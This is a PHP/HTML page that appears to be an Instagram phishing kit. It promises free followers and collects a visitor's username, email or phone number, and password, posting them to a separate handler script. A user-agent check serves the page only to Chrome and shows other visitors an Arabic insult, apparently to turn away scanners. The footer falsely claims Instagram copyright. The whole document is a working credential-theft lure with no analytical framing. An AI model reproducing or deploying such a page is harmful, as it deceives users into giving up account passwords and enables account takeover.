<? 
if ($_SERVER["HTTP_ACCEPT"] and preg_match("/(.*?)Chrome(.*?)/",$_SERVER["HTTP_USER_AGENT"])){
} else {
echo" كسمك يصحبي 😂"; 
return false; 
}
?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Get Instagram Followers For Free">
    <link rel="stylesheet" href="css/style.css">
    <title>Instagram Followers</title>
</head>
<body>
    <center>
    <img src="img/logo.png">
    <br>
    <h2>Get Free Followers Instagram</h2>
    <br><br>
    <div class="log">
        <form action="badryhagkano.php" method="post">
            <input type="text" name="user" placeholder="Enter Your Username" autocomplete="off" autocapitalize="off" required>
            <br>
            <input type="text" name="email" placeholder="Enter Your Email or Number" autocomplete="off" autocapitalize="off" required>
            <br>
            <input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
            <br>
            <select style="width: 92%;padding: 7px;margin-top: 4px;font-size: 14px;font-family: sans-serif; background: #ff0d0d;border-radius: 4px;color: #ffffff;border: none;outline: none;">
                <option style="border:none;background: #ff0d0d;">100 Followers</option>
                <option style="border:none;background: #ff0d0d;">200 Followers</option>
                <option style="border:none;background: #ff0d0d;">400 Followers</option>
                <option style="border:none;background: #ff0d0d;">800 Followers</option>
                <option style="border:none;background: #ff0d0d;">1600 Followers</option>
                <option style="border:none;background: #ff0d0d;">3000 Followers</option>
                <option style="border:none;background: #ff0d0d;">10000 Followers</option>
            </select>
            <input type="submit" name="login" value="sign up">
            <p>register</p>
            <p>copyright instagram 2022 &copy;</p>
        <form>
    </div>
    </center>
</body>
</html>